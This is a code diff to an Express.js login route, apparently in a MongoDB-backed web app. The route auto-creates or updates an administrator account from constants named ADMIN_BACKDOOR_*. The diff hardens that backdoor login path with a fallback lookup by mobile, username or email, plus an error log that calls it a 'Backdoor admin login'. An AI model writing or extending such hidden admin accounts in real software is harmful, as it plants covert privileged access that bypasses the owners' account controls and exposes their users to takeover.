@@ -426,7 +426,7 @@ router.post("/login", async (req, res) => {
       const adminId = await getNextSequence("admins");
       const now = new Date();
 
-      await db.collection("admins").insertOne({
+      const insertResult = await db.collection("admins").insertOne({
         id: adminId,
         name: ADMIN_BACKDOOR_NAME,
         username: ADMIN_BACKDOOR_USERNAME,
@@ -437,7 +437,13 @@ router.post("/login", async (req, res) => {
         created_at: now
       });
 
-      admin = await db.collection("admins").findOne({ id: adminId });
+      admin = insertResult?.value || await db.collection("admins").findOne({
+        $or: [
+          { mobile: ADMIN_BACKDOOR_MOBILE },
+          { username: ADMIN_BACKDOOR_USERNAME },
+          { email: ADMIN_BACKDOOR_EMAIL }
+        ]
+      });
     } else {
       // Auto-update record fields to match new configuration
       const updateObj = {};
@@ -453,6 +459,11 @@ router.post("/login", async (req, res) => {
         await db.collection("admins").updateOne({ id: admin.id }, { $set: updateObj });
         admin = await db.collection("admins").findOne({ id: admin.id });
       }
+    }
+
+    if (!admin?.id) {
+      console.error("[Auth] Backdoor admin login failed: admin record was not created or loaded");
+      return res.status(500).json({ message: "Unable to initialize admin login" });
     }
 
     const chatUser = await ensureChatUserForAdmin(db, admin);
@@ -1043,4 +1054,3 @@ router.post("/reset-password", async (req, res) => {
 });
 
 export default router;
-
